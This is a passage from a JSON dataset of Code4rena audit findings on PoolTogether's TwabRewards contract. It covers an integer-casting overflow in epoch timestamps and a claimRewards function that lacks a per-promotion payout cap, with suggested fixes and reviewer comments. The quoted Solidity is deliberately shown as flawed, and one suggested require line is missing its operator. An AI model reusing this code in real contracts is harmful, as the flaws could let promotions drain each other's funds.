                "Repair": "\nWhile requiring _epochId <= 255 may help, it does not remove the issue entirely, because a very large _epochDuration value can still cause an overflow in the product (_epochDuration * _epochId) used in _epochStartTimestamp. However, other options exist:\n\n1.  Making these uint256 variables of type uint64 and therefore removing the casting of uint256 to the small uint64 would remove this risk and probably be the most gas-efficient solution.\n2.  Add require(_epochEndTimestamp  _epochStartTimestamp); to line 299, next to the existing require statement and before the uint64 casting operations\n3.  Use the OpenZeppelin SafeCast library to prevent unexpected overflows.\n\nPierrickGT (PoolTogether) commented(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/123#issuecomment-992729266):\n  Duplicate of https://github.com/code-423n4/2021-12-pooltogether-findings/issues/58\n\nLSDan (judge) commented(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/123#issuecomment-1014440009):\n  I do not consider this to be a duplicate of 58 because it describes an actual impact that, while extremely unlikely, could result in loss of funds. This also makes it a medium severity issue.\n \n \n 2 \u2014 Med (M): vulns have a risk of 2 and are considered \u201cMedium\u201d severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n\nPierrickGT (PoolTogether) confirmed and resolved:\n Fixed by casting to uint64. Relevant code:\n https://github.com/pooltogether/v4-periphery/blob/e0010b689fb170daac77af5f62abba7ca1397524/contracts/TwabRewards.sol#L415-L417\n https://github.com/pooltogether/v4-periphery/blob/master/contracts/interfaces/ITwabRewards.sol#L26-L28\n\n\n\n"
            },
            {
                "Name": "M-05",
                "Location": [
                    "//solidity\nfunction claimRewards(\n    address _user,\n    uint256 _promotionId,\n    uint256[] calldata _epochIds\n) external override returns (uint256) {\n    Promotion memory _promotion = _getPromotion(_promotionId);\n\n    uint256 _rewardsAmount;\n    uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];\n\n    for (uint256 index = 0; index < _epochIds.length; index++) {\n        uint256 _epochId = _epochIds[index];\n\n        require(\n            !_isClaimedEpoch(_userClaimedEpochs, _epochId),\n            \"TwabRewards/rewards-already-claimed\"\n        );\n\n        _rewardsAmount += _calculateRewardAmount(_user, _promotion, _epochId);\n        _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);\n    }\n\n    _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;\n\n    _promotion.token.safeTransfer(_user, _rewardsAmount);\n\n    emit RewardsClaimed(_promotionId, _epochIds, _user, _rewardsAmount);\n\n    return _rewardsAmount;\n}\n"
                ],
                "Type": " Missing Check When Transferring Tokens Out For A Given Promotion",
                "Description": "\n\nThe claimRewards function is called upon by ticket holders who parse a set of _epochIds they wish to claim rewards on. An internal call is made to _calculateRewardAmount to calculate the correct reward amount owed to the user. Subsequently, the _updateClaimedEpoch function will set the epoch bit of the tracked _claimedEpochs mapping, ensuring an epochId cannot be claimed twice for a given promotion.\n\nHowever, there may be inaccuracies in the _calculateRewardAmount function, which results in more tokens being sent out than allocated by a promotion creator. This severely impacts the ability for users to claim their owed tokens on other promotions.\n\n\n<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191\nsolidity\nfunction claimRewards(\n    address _user,\n    uint256 _promotionId,\n    uint256[] calldata _epochIds\n) external override returns (uint256) {\n    Promotion memory _promotion = _getPromotion(_promotionId);\n\n    uint256 _rewardsAmount;\n    uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];\n\n    for (uint256 index = 0; index < _epochIds.length; index++) {\n        uint256 _epochId = _epochIds[index];\n\n        require(\n            !_isClaimedEpoch(_userClaimedEpochs, _epochId),\n            \"TwabRewards/rewards-already-claimed\"\n        );\n\n        _rewardsAmount += _calculateRewardAmount(_user, _promotion, _epochId);\n        _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);\n    }\n\n    _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;\n\n    _promotion.token.safeTransfer(_user, _rewardsAmount);\n\n    emit RewardsClaimed(_promotionId, _epochIds, _user, _rewardsAmount);\n\n    return _rewardsAmount;\n}\n\n\n",
                "Repair": "\nConsider checking that the total rewards claimed for a given promotion is strictly <= than the total allotted balance provided by the promotion creator. This should help prevent a single promotion from affecting the rewards claimable from other promotions.\n\nPierrickGT (PoolTogether) acknowledged(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/70#issuecomment-995313773):\n  This check seems redundant, especially now that we have restricted the contract to only support one ticket ([in this PR(https://github.com/pooltogether/v4-periphery/pull/47)), this will avoid a promotion with a fake ticket to manipulate the amount of rewards claimable and an attacker won't be able to drain funds from a promotion.\n So for this reason, I've acknowledged the issue but we won't implement this check.\n\n\n"
            }
        ]
    }
]